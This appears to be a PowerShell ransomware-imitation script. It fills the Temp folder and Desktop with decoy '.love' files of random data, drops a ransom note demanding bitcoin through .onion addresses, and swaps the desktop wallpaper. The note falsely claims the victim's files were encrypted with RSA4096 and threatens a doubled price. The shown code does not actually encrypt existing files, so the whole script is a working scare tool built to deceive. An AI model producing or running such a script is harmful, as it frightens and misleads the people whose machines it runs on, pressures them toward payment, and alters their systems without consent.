param(
    [string]$OutputPath = (Join-Path ([Environment]::GetFolderPath("Desktop")) "hello.txt")
)

# Set console colors
$Host.UI.RawUI.BackgroundColor = "White"
$Host.UI.RawUI.ForegroundColor = "Black"
Clear-Host

# ========== PART 1: Keccak hash ==========
$keccakSource = @"
using System;

public static class kec
{
    private static readonly ulong[] RC = new ulong[]
    {
        0x0000000000000001UL, 0x0000000000008082UL, 0x800000000000808AUL, 0x8000000080008000UL,
        0x000000000000808BUL, 0x0000000080000001UL, 0x8000000080008081UL, 0x8000000000008009UL,
        0x000000000000008AUL, 0x0000000000000088UL, 0x0000000080008009UL, 0x000000008000000AUL,
        0x000000008000808BUL, 0x800000000000008BUL, 0x8000000000008089UL, 0x8000000000008003UL,
        0x8000000000008002UL, 0x8000000000000080UL, 0x000000000000800AUL, 0x800000008000000AUL,
        0x8000000080008081UL, 0x8000000000008080UL, 0x0000000080000001UL, 0x8000000080008008UL
    };

    private static readonly int[] R = new int[]
    {
         0,  1, 62, 28, 27,
        36, 44,  6, 55, 20,
         3, 10, 43, 25, 39,
        41, 45, 15, 21,  8,
        18,  2, 61, 56, 14
    };

    private static ulong Rol(ulong x, int n)
    {
        n = n % 64;
        if (n == 0) return x;
        return (x << n) | (x >> (64 - n));
    }

    private static void KeccakF1600(ulong[] s)
    {
        for (int round = 0; round < 24; round++)
        {
            ulong[] c = new ulong[5];
            for (int x = 0; x < 5; x++)
                c[x] = s[x] ^ s[x + 5] ^ s[x + 10] ^ s[x + 15] ^ s[x + 20];

            ulong[] d = new ulong[5];
            for (int x = 0; x < 5; x++)
                d[x] = c[(x + 4) % 5] ^ Rol(c[(x + 1) % 5], 1);

            for (int x = 0; x < 5; x++)
                for (int y = 0; y < 5; y++)
                    s[x + 5 * y] ^= d[x];

            ulong[] b = new ulong[25];
            for (int x = 0; x < 5; x++)
            {
                for (int y = 0; y < 5; y++)
                {
                    int newX = y;
                    int newY = (2 * x + 3 * y) % 5;
                    b[newX + 5 * newY] = Rol(s[x + 5 * y], R[x + 5 * y]);
                }
            }

            for (int x = 0; x < 5; x++)
            {
                for (int y = 0; y < 5; y++)
                {
                    s[x + 5 * y] = b[x + 5 * y] ^ ((~b[(x + 1) % 5 + 5 * y]) & b[(x + 2) % 5 + 5 * y]);
                }
            }

            s[0] ^= RC[round];
        }
    }

    public static byte[] Hash(byte[] message, int outputBytes)
    {
        int rateBytes = 200 - 2 * outputBytes;
        ulong[] state = new ulong[25];

        int msgLen = message.Length;
        int blockCount = (msgLen / rateBytes) + 1;
        int paddedLen = blockCount * rateBytes;
        byte[] padded = new byte[paddedLen];
        Array.Copy(message, padded, msgLen);
        padded[msgLen] |= 0x01;
        padded[paddedLen - 1] |= 0x80;

        for (int offset = 0; offset < paddedLen; offset += rateBytes)
        {
            for (int i = 0; i < rateBytes / 8; i++)
            {
                ulong lane = 0;
                for (int b = 0; b < 8; b++)
                    lane |= ((ulong)padded[offset + i * 8 + b]) << (8 * b);
                state[i] ^= lane;
            }
            KeccakF1600(state);
        }

        byte[] output = new byte[outputBytes];
        int produced = 0;
        while (produced < outputBytes)
        {
            for (int i = 0; i < rateBytes / 8 && produced < outputBytes; i++)
            {
                ulong lane = state[i];
                for (int b = 0; b < 8 && produced < outputBytes; b++)
                {
                    output[produced++] = (byte)(lane >> (8 * b));
                }
            }
            if (produced < outputBytes)
                KeccakF1600(state);
        }

        return output;
    }
}
"@

Add-Type -TypeDefinition $keccakSource -Language CSharp

$randomBytes = New-Object byte[] 32
$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
$rng.GetBytes($randomBytes)
$rng.Dispose()

$hashBytes = [kec]::Hash($randomBytes, 28)
$hashHex = ([BitConverter]::ToString($hashBytes)) -replace '-', ''
$hashHex = $hashHex.ToLower()

$Container = Join-Path $env:USERPROFILE 'AppData\Local\Temp' 
if (-not (Test-Path $Container)) {
    New-Item -ItemType Directory -Path $Container -Force | Out-Null
}

$FolderCount = 50
$UsedFolders = [System.Collections.Generic.HashSet[string]]::new()
$Rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

for ($i = 1; $i -le $FolderCount; $i++) {

    do {
        $Hash = -join ((1..32) | ForEach-Object {
            '{0:x}' -f (Get-Random -Minimum 0 -Maximum 16)
        })
    } while (-not $UsedFolders.Add($Hash))

    $FolderPath = Join-Path $Container $Hash
    New-Item -ItemType Directory -Path $FolderPath -Force | Out-Null

    $FileCountInFolder = Get-Random -Minimum 1 -Maximum 4

    for ($f = 1; $f -le $FileCountInFolder; $f++) {
        $FileName = (-join ((1..16) | ForEach-Object {
            '{0:x}' -f (Get-Random -Minimum 0 -Maximum 16)
        })) + ".love"

        $FilePath = Join-Path $FolderPath $FileName

        $ByteCount = Get-Random -Minimum 1024 -Maximum 8196
        $Bytes = New-Object byte[] $ByteCount
        $Rng.GetBytes($Bytes)

        $Content = [Convert]::ToBase64String($Bytes)
        Set-Content -Path $FilePath -Value $Content -Encoding UTF8
    }
}

$Rng.Dispose()

1..1737 | ForEach-Object {
    $bytes = New-Object byte[] 32
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes)
    [Convert]::ToBase64String($bytes)
}

@"
NOT YOUR LANGUAGE? USE https://translate.google.com

What happened to your files ?
All of your files were protected by a strong encryption with RSA4096.
More information about the encryption keys using RSA4096 can be found here: http://en.wikipedia.org/wiki/RSA_(cryptosystem)

How did this happen ?
!!! Specially for your PC was generated personal RSA4096 Key, both public and private.
!!! ALL YOUR FILES were encrypted with the public key, which has been transferred to your computer via the Internet.
!!! Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our Secret Server.

What do I do ?
are two ways you can choose: wait for a miracle and get your PRICE DOUBLED! Or start obtaining *BITCOIN NOW!, and restore YOUR DATA
have really valuable DATA, you better NOT WASTE YOUR TIME, because there is NO other way to get your files, except make a PAYM

Your personal ID: $hashHex

For more specific instructions, please visit your personal home page, there are a few different addresses pointing to your page below:

1 - http://ccljwlb22w6c22p2k.onion.to
2 - http://ccljwlb22w6c22p2k.onion.city

If for some reasons the addresses are not available follow these steps:

1- Download and install Tor-browser: http://www.torproject.org/projects/torbrowser.html.en
2- Video instruction: https://www.youtube.com/watch?v=NOrUZdw2hA
3- After a successful installation, run the browser
4- Type in the address bar: http://ccljwlb22w6c22p2k.onion
5- Follow the instructions on the site
"@ | Out-File -FilePath $OutputPath -Encoding utf8
Write-Host $hashHex

$OutputDir = [Environment]::ExpandEnvironmentVariables("%USERPROFILE%\Desktop")
$FileCount = 32

for ($i = 1; $i -le $FileCount; $i++) {
    $FileName = -join ((1..16) | ForEach-Object {
        '{0:x}' -f (Get-Random -Minimum 0 -Maximum 16)
    })
    $FilePath = Join-Path $OutputDir "$FileName.love"
    $ByteCount = Get-Random -Minimum 1024 -Maximum 8196
    $Bytes = New-Object byte[] $ByteCount
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($Bytes)
    $Content = [Convert]::ToBase64String($Bytes)
    Set-Content -Path $FilePath -Value $Content -Encoding UTF8
}

$Wallpaper = Join-Path $PSScriptRoot "__.bmp"

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(
        int uAction,
        int uParam,
        string lpvParam,
        int fuWinIni);
}
"@

# SPI_SETDESKWALLPAPER = 20, SPIF_UPDATEINIFILE = 0x01, SPIF_SENDCHANGE = 0x02
[Wallpaper]::SystemParametersInfo(20, 0, $Wallpaper, 0x01 -bor 0x02)
